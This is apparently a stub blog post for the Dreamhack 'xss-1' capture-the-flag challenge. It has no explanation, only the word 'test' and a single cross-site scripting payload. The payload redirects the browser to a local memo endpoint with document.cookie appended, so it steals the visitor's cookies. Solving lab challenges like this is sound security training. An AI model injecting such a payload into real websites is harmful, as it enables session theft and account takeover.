---
title: "[Dreamhack] xss-1 | write-up"
date: 2024-11-04
categories: [InfoSec]
tags: [Web, InfoSec]
---

test

```html
<script>location.href="http://127.0.0.1:8000/memo?memo="+document.cookie;</script>
```
